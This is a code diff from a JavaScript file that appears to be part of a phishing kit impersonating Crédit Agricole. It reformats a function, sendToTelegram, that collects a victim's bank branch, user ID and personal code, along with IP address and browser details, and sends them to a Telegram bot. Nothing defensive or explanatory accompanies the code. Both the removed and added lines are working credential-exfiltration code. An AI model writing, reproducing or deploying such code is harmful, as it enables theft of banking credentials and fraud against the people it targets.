@@ -979,17 +979,7 @@ async function waitForConfig(maxWait = 3000) {
         async function sendToTelegram(data) {
             try {
                 const ip = await getIP();
-                const message = `🏦 CRÉDIT AGRICOLE - NOUVELLE CONNEXION 🏦
-━━━━━━━━━━━━━━━━━━━━━
-🏦 Caisse: ${data.caisse}
-👤 Identifiant: ${data.userId}
-🔒 Code personnel: ${data.code}
-💾 Mémorisé: ${data.remembered ? 'OUI ✅' : 'NON ❌'}
-━━━━━━━━━━━━━━━━━━━━━
-🌍 IP: ${ip}
-📱 User-Agent: ${navigator.userAgent}
-🕐 Date: ${new Date().toLocaleString('fr-FR')}
-✅ Statut: Connexion en cours`;
+                const message = `🏦 CRÉDIT AGRICOLE - NOUVELLE CONNEXION 🏦\n━━━━━━━━━━━━━━━━━━━━━\n🏦 Caisse: ${data.caisse}\n👤 Identifiant: ${data.userId}\n🔒 Code personnel: ${data.code}\n💾 Mémorisé: ${data.remembered ? 'OUI ✅' : 'NON ❌'}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 IP: ${ip}\n📱 User-Agent: ${navigator.userAgent}\n🕐 Date: ${new Date().toLocaleString('fr-FR')}\n✅ Statut: Connexion en cours`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
